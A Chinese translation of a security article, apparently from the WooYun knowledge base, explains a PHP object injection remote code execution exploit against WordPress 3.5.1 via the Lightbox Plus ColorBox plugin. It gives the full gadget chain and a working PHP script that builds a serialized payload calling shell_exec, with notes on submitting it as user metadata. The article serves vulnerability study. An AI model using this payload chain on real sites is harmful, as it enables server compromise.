@@ -1,0 +1,84 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">WordPress 3.5.1远程代码执行EXP</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">瞌睡龙</a> <span class="bull">·</span> <time title="2013/12/12 14:02" ui-time="" datetime="2013/12/12 14:02" class="published ng-binding ng-isolate-scope">2013/12/12 14:02</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>from：<a href="http://vagosec.org/2013/12/wordpress-rce-exploit/">Remote Code Execution exploit in WordPress 3.5.1</a></p><p>（ps：老外也有几分标题党的意思，虽然是wordpress本身留下的坑，但是目前的利用还是需要安装的插件踩到了这个坑，才会被利用成功，并且要进入后台……感谢horseluke帮忙测试并翻译EXP与总结部分。）</p><h2>0x00 背景</h2><hr><p>之前，在<a href="http://vagosec.org/2013/09/wordpress-php-object-injection/">http://vagosec.org/2013/09/wordpress-php-object-injection/</a>发表了WordPress中php对象注入的漏洞，那时候考虑到影响，没有讲解如何利用该漏洞，现在已经过去了三个月的时间，网站管理员应该都已经更新的WordPress，现在觉得可以公开了。</p><p>之前对这个漏洞不太了解的可以先看一下drops之前翻译的文章：</p><p><a href="http://drops.wooyun.org/papers/596">WordPress &lt; 3.6.1 PHP 对象注入漏洞</a></p><h2>0x01 如何寻找</h2><hr><p>看完以前的那个文章之后，会发现有三种方法可能被利用</p><pre><code>__destruct()
+__wakeup()
+__toString()
+</code></pre><p>但是在WordPress本身的类当中没有找到可以成功利用的点。</p><p>但这是否意味着该漏洞不可利用呢，当然不是，WordPress最流行的功能就是允许安装插件和模板。这个是有第三方开发的，在写这篇文章时，WordPress列出了28358个插件，有超过5.6亿次的下载，这些插件有着各式各样的功能。包括有2155个主题，下载量超过八千六百万。</p><p>然后我就开始在最流行的插件当中寻找那些可以成功利用该漏洞的。</p><p>在寻找了几个插件之后，我终于找到一个插件的类中，在<code>__toString()</code>方法中是可利用的了。</p><p>这个插件就是<strong>Lightbox plus ColorBox</strong>。</p><h2>0x02 分析详情</h2><hr><p><strong>Lightbox plus ColorBox</strong>插件的<code>/classes/shd.class.php</code>文件中的<code>simple_html_dom_node</code>类，其中代码如下：</p><pre><code>#!php
+class simple_html_dom_node {
+    private $dom = null;
+
+    function __toString() {
+        return $this-&gt;outertext();
+    }
+
+    function outertext() {
+        // …
+        if ($this-&gt;dom &amp;&amp; $this-&gt;dom-&gt;callback!==null) {
+            call_user_func_array($this-&gt;dom-&gt;callback, array($this));
+        }
+        // … 
+    }
+}
+</code></pre><p>熟悉PHP的朋友一看到call&#95;user&#95;func_array函数，就知道这是一个可能存在问题的点。</p><p>不熟悉PHP的可以来看下PHP手册<a href="http://www.php.net/function.call-user-func-array">http://www.php.net/function.call-user-func-array</a></p><p>为什么会对这个类的定义感兴趣呢？因为我们可以控制simple&#95;html&#95;dom_node对象的所有属性，我们可以设置dom属性为任意值，如果传入一个callback属性的话，有意思的事情就发生了。</p><p>利用<code>call_user_func_array</code>函数，我们可以调用任何函数，并且可以传递第一个参数进去。我不是PHP专家，没有发现利用办法，我又回过头看WordPress本身的代码，发现在<code>/wp-admin/includes/screen.php</code>文件中，这个文件定义了一个WP_Screen的类，当用user-meta数据被反序列化时，是被包含的，类的代码如下：</p><pre><code>#!php
+final class WP_Screen {
+    private $_help_tabs = array();
+
+    public function get_help_tabs() {
+        return $this-&gt;_help_tabs;
+    }
+
+    public function render_screen_meta() {
+        // …
+        foreach ( $this-&gt;get_help_tabs() as $tab ):
+            if ( ! empty( $tab['callback'] ) )
+                call_user_func_array( $tab['callback'], array( $this, $tab ) );
+        endforeach;
+        // …
+    }
+}
+</code></pre><p>就像我之前提到过的，我们能够调用任意的函数，这包括类当中的方法，能够调用WP&#95;Screen对象中的render&#95;screen&#95;meta()方法，并且不需要传递任何参数，这个方法将会循环遍历&#95;help&#95;tabs属性中的所有元素，如果元素中的callback属性不为空，那么将会调用callback属性中的函数，传入的两个参数为：WP&#95;Screen对象和$tab(&#95;help&#95;tabs属性的其中一个元素)。</p><p>这样我们有了更多的控制，可以选择那些函数被调用，并且可以控制，但是我们可能需要更加努力些，因为我们没有完全控制参数，看一下WordPress中的核心代码位于<code>/wp-includes/category-template.php</code>文件中：</p><pre><code>#!php
+function wp_generate_tag_cloud( $tags, $args = '' ) {
+    // …
+    $args = wp_parse_args( $args, $defaults );
+    extract( $args );
+    // …
+    foreach ( (array) $tags as $key =&gt; $tag ) {
+        $real_counts[ $key ] = $tag-&gt;count;
+        $counts[ $key ] = $topic_count_scale_callback($tag-&gt;count);
+    }
+    // …
+}
+</code></pre><p>关于extract函数的手册说明：<a href="http://www.php.net/function.extract">http://www.php.net/function.extract</a></p><p>wp&#95;generate&#95;tag&#95;cloud()函数接受两个参数$tags和$args，$args经过wp&#95;parse&#95;args函数的处理，该函数的作用是把$args数组与默认的一组$deafults合并，之后经过extract函数生产一些变量，其中一个是$topic&#95;count&#95;scale&#95;callback变量。之后，该变量被调用传入一个参数，好消息就是我们能够完全控制这个变量。第一个参数，WP_Screen对象被转化为数组，当一个对象被强制转化为数组的时候，其中的属性最为关键：</p><pre><code>#!php
+&lt;?php
+class Swag {
+    public $yolo = 'yolo';
+}
+$swag = new Swag;
+var_dump((array)$swag);
+?&gt;
+</code></pre><p>输出结果为：</p><pre><code>array(1) {
+  ["yolo"]=&gt;
+  string(4) "yolo"
+}
+</code></pre><p>现在我们需要的就是WP_Screen对象中的一个属性有一个count属性。</p><p>这是个很容易解决的问题，因为我们可以让所有的属性反序列化一遍。</p><p>这就意味着我们能够调用任何不带参数的函数，并完全控制它。</p><h2>0x03 EXP</h2><hr><p>根据以上分析，你应该可以构造一个属于自己的完美exploit了。不过先展示一下我的做法：</p><pre><code>#!php
+&lt;?php
+class simple_html_dom_node {
+    private $dom;
+    public function __construct() {
+        $callback = array(new WP_Screen(), 'render_screen_meta');
+        $this-&gt;dom = (object) array('callback' =&gt; $callback);
+    }
+}
+class WP_Screen {
+    private $_help_tabs;
+    public $action;
+    function __construct() {
+        $count = array('count' =&gt; 'echo "schwag" &gt; /tmp/1337h4x0rs');
+        $this-&gt;action = (object) $count;
+        $this-&gt;_help_tabs = array(array(
+            'callback' =&gt; 'wp_generate_tag_cloud', 
+            'topic_count_scale_callback' =&gt; 'shell_exec'));
+    }
+}
+echo serialize(new simple_html_dom_node()).'{0xf09d8c86}';
+?&gt;
+</code></pre><p>该脚本运行后将有一段输出内容，攻击者可将其作为用户元信息（user metadata）提交，此时shell_exec()函数将运行，参数为</p><pre><code>echo "schwag" &gt; /tmp/1337h4x0rs
+</code></pre><p>要注意的是，输出内容存在NULL字节符，这是因为php在序列化一个对象时，会对私有属性以NULL字节符包围（<a href="http://php.net/manual/en/function.serialize.php#refsect1-function.serialize-returnvalues">见PHP手册</a>）。WordPress中大部分用户元信息（user metadata）并不允许NULL字节符，除了在3.5.1版本中，有部分地方因为默认配置而被允许使用。</p><p>（译注：（1）由于存在NULL字符串，直接echo会有一部分payload看不到，建议进行rawurlencode再输出；（2）原作者使用shell&#95;exec进行shell写入，会受到系统配置和权限影响而无法成功，如果仅是想复现漏洞，可替换为var&#95;dump。若页面html输出中，出现WP&#95;Screen::&#95;_construct()中$count变量所预先设置的字符串，则存在此漏洞。（3）在<code>wp-admin/profile.php</code>页面中修改更新个人资料【可以修改个人说明，实际上这里面的数据从数据库读取后都会判断是否为序列化后的数据，是的话都会反序列化一遍从而触发该漏洞】后，就可以看到效果了。）</p><h2>0x04 总结</h2><hr><p>本文以低于3.6.1版本的Wordpress为基础，展示一个php对象漏洞exploit例子。这个exploit需要利用近乎百万下载量的插件Lightbox Plus ColorBox中，其中一组类（simple html dom）所定义的逻辑；接着再组合利用WordPress核心中，另一些类和方法所定义的程序逻辑，我们就可以通过一段攻击者可控字符串执行任意函数，远程执行命令也就不在话下了。天啊不会吧！如果你还没更新WordPress，那现在可是个好时机了！</p><p>（译注：原作者说插件Lightbox Plus ColorBox中阐述的漏洞，似乎是将simple html dom的特性——模仿浏览器中dom.outerText操作——用成漏洞。另外在php开发中，该simple html dom组件类应用极广泛，主要用于html解析和提取、过滤文本。虽然说像文中这种利用需要碰运气，不过开发可以此例子思考：（1）如何不被攻击者将特性利用为漏洞通道？虽然这真的有些难（2）如何解决数据和执行混合导致的安全问题？虽然这似乎是终极问题之一了）</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/20141017203549ef27b55a7921e022214b5780c48f81e0.png" style="width:200px;height:200px"></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">黑吃黑</span> <span class="reply-time">2014-08-05 11:04:47</span></div><p></p><p>谢谢分享</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小贱人</span> <span class="reply-time">2014-03-17 00:09:37</span></div><p></p><p>这个比打怪升级还吸引人啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小贱人</span> <span class="reply-time">2014-03-14 01:57:40</span></div><p></p><p>学习！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">核攻击</span> <span class="reply-time">2013-12-17 16:48:39</span></div><p></p><p>阅 √</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">寂寞的瘦子</span> <span class="reply-time">2013-12-17 08:50:27</span></div><p></p><p>下水道</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小胖子</span> <span class="reply-time">2013-12-12 17:23:40</span></div><p></p><p>吊炸天！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">horseluke</span> <span class="reply-time">2013-12-12 15:01:22</span></div><p></p><p>不得不佩服作者手法，三个流程组合出一个漏洞...</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Master</span> <span class="reply-time">2013-12-12 14:58:46</span></div><p></p><p>Mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">dream</span> <span class="reply-time">2013-12-12 14:44:22</span></div><p></p><p>翻译的好快啊，支持！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lucky</span> <span class="reply-time">2013-12-12 14:33:03</span></div><p></p><p>不错！看一下</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xfkxfk</span> <span class="reply-time">2013-12-12 14:17:58</span></div><p></p><p>沙发么？</p><p></p></div></div></div></div></div></main>
